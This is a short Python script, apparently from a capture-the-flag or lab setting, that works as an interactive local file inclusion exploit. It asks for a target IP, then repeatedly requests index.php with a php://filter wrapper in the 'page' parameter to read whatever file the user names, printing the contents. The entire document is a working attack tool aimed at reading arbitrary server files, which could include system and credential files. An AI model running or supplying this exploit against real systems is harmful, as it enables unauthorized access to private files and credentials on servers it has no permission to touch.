import requests

#Getting the IP and the file to be accessed from the user
IP = input("Enter the target IP: ")

while True:
	File= input("Enter the file that you want to access using LFI: ")
	print("Fetching the file....\n")
	response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
	response_text = response.text
	print(response_text)